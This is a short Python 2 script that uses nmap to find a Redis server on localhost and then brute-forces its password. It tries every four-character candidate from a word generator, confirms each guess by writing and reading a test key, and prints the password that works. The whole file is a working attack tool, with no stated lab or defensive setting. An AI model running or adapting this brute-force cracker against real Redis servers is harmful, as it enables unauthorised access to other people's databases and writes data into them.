#!/usr/bin/python
# -*- coding: utf-8 -*-

import sys
import nmap
import redis
from redis import exceptions
import string
try:
    import pwddict
except:
    try:
        sys.path.append('.')
        import pwddict
    except:
        sys.exit(2)

rhost = "127.0.0.1"
rport = 6379

# Use nmap to scan default port number
print "[-] Start to run port scanning"
nm = nmap.PortScanner()
response = nm.scan('127.0.0.1', '6379')

product_info = response['scan']['127.0.0.1']['tcp'][6379]
if product_info['state'] == 'open':
    print "[-] Redis server is running on default port"

# generates word list
rpwd = ''
p = pwddict.SimpleEngine(string_length=4)
for password in p.generator():
    try:
        pwd = ''.join(password)
        print "[-] Try password {0}".format(pwd)
        r = redis.Redis(host=rhost, port=rport, db=0, password=pwd)
        r.set("foot", "bar")
        if r.get("foot") == "bar":
            rpwd = pwd
            break;
    except exceptions.ResponseError:
        print "[-] Failed to auth by redis server."
        continue

print "Success to crack the auth, password is {0}".format(rpwd)
